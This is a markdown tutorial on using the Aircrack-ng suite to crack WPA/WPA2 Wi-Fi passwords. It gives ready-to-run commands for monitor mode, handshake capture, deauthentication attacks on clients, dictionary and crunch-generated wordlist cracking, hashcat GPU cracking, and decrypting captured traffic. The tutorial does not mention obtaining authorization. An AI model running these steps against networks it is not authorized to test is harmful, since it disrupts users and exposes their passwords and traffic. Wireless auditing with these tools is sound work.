# Aircrack-ng Suite Complete Guide

The **Aircrack-ng suite** is a complete set of tools to assess Wi-Fi
network security. It focuses on different areas of Wi-Fi security: -
Monitoring: Packet capture and export of data to text files for further
processing by third-party tools. - Attacking: Replay attacks,
deauthentication, fake access points, and others. - Testing: Checking
Wi-Fi cards and driver capabilities (capture and injection). - Cracking:
WEP and WPA/WPA2-PSK keys.

------------------------------------------------------------------------

## Common Tools in the Suite

-   **airmon-ng**: Enables monitor mode on wireless interfaces.
-   **airodump-ng**: Captures packets, including handshakes.
-   **aireplay-ng**: Injects packets for attacks like deauthentication.
-   **aircrack-ng**: Cracks WEP and WPA/WPA2-PSK keys.
-   **airdecap-ng**: Decrypts WEP/WPA/WPA2 capture files with known
    keys.

------------------------------------------------------------------------

## Typical Workflow for WPA/WPA2 Cracking

### 1. Enable Monitor Mode

``` bash
sudo airmon-ng start wlan0
```

This creates a monitor-mode interface (e.g., `wlan0mon`).

### 2. Capture Handshake

``` bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```

-   `<BSSID>`: MAC address of target AP.
-   `<channel>`: Channel number.
-   `-w capture`: Output file prefix (e.g., `capture.cap`).

Wait for a client to connect or run a deauthentication attack:

``` bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon
```

This forces a client to reconnect, capturing the handshake.

------------------------------------------------------------------------

## Extracting Wi-Fi Passwords from a .cap File with a Captured Four-Way Handshake

Once you have captured a WPA/WPA2 four-way handshake into a `.cap` file,
you can attempt to extract the Wi-Fi password using **aircrack-ng**.
Below are the step-by-step instructions:

### 1. Verify Handshake Capture

Before attempting cracking, ensure that the `.cap` file contains a valid
handshake.

``` bash
aircrack-ng capture.cap
```

-   Look for confirmation like `WPA handshake: <BSSID>` in the output.

### 2. Use a Wordlist to Crack the Password

Aircrack-ng uses dictionary attacks. You need a wordlist of potential
passwords. - Common example: `/usr/share/wordlists/rockyou.txt`

Run:

``` bash
aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture.cap
```

Where: - `-w` specifies the wordlist. - `-b` specifies the target BSSID
(the AP's MAC address). - `capture.cap` is your handshake file.

If the password is in the wordlist, aircrack-ng will display it:

    KEY FOUND! [ password_here ]

### 3. Using Crunch to Generate a Custom Wordlist (Optional)

If you suspect the password format, generate a tailored wordlist with
`crunch`. Example (8-digit numeric passwords):

``` bash
crunch 8 8 0123456789 -o numeric.txt
```

Then run aircrack-ng with this file:

``` bash
aircrack-ng -w numeric.txt -b <BSSID> capture.cap
```

### 4. GPU Acceleration (Optional)

For faster cracking, use **hashcat** with GPU support:

``` bash
hashcat -m 22000 handshake.hc22000 wordlist.txt
```

> Note: Convert `.cap` file to `.hc22000` with `hcxpcapngtool` before
> using hashcat.

### 5. Best Practices

-   Use strong, targeted wordlists (considering SSID-related patterns).
-   Ensure capture file has a complete handshake.
-   Use GPU acceleration when available for efficiency.

------------------------------------------------------------------------

## Decrypting Traffic with Known Keys

Once a WPA key is found, you can decrypt captured traffic:

``` bash
airdecap-ng -w password capture.cap
```

This outputs a decrypted `.cap` file for analysis.

------------------------------------------------------------------------

## Summary

The Aircrack-ng suite allows: 1. Putting Wi-Fi cards into monitor mode.
2. Capturing WPA/WPA2 four-way handshakes. 3. Using dictionary or custom
wordlists to crack Wi-Fi passwords. 4. Accelerating attacks with GPU
tools like hashcat. 5. Decrypting traffic once the key is known.

✅ With these steps, you can test `.cap` files for password recovery
using aircrack-ng or hashcat. This process is widely used in penetration
testing to audit Wi-Fi security.
